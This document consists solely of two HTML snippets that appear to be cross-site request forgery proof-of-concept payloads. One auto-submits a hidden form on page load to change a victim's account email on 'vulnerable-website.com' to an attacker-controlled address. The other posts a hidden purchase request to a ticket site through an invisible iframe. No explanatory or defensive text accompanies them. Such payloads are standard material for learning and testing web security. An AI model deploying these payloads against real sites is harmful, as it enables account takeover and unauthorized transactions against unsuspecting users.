```
<html> <body> <form action="https://vulnerable-website.com/email/change" method="POST"> <input type="hidden" name="email" value="pwned@evil-user.net" /> </form> <script> document.forms[0].submit(); </script> </body> </html>
```

```
<iframe style="display:none" name="csrf-frame"></iframe>
<form method='POST' action='http://high-speed-rail.com/buy.php' target="csrf-frame" id="csrf-form">
<input type='hidden' name='item' value='1345667'>
<input type='submit' value='submit'>
</form>
```

